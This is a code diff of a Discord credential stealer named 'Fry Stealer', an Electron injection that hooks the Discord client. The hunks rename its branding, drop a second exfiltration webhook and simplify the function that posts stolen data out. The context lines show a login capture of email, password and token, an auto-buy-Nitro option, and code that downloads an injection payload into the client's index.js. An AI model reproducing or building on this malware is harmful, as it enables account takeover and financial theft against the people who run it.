@@ -7,12 +7,11 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%', 
-  webhook2: '%WEBHOOK2%',
   ip: '%IP%',
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@here', 
-  embed_name: 'Fry Stealer', 
+  embed_name: 'FryStealer', 
   embed_icon: 'https://wallpaperspeed.id/gallery/wallpaper/20220427/draw-you-an-anime-profile-picture-by-rinruru-fiverr,how-to-make-anime-profile-picture-preview.webp',
   embed_color: 0x404EED, 
   api: 'https://discord.com/api/v9/users/@me',
@@ -421,7 +420,6 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK2%', '${config.webhook2}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -572,8 +570,7 @@ const getBadges = (flags) => {
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
-  const url = new URL(config.webhook, config.webhook2);
-  
+  const url = new URL(config.webhook);
   const headers = {
     'Content-Type': 'application/json',
     'Access-Control-Allow-Origin': '*',
@@ -597,6 +594,7 @@ const hooker = async (content) => {
   req.write(data);
   req.end();
 };
+
 
 const login = async (email, password, token) => {
   const json = await getInfo(token);
@@ -864,7 +862,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Fry Stealer',
+          text: 'FryStealer',
         },
       },
     ],
@@ -878,7 +876,7 @@ session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, call
 });
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(config.webhook, config.webhook2)) {
+  if (details.url.startsWith(config.webhook)) {
     if (details.url.includes('discord.com')) {
       callback({
         responseHeaders: Object.assign(
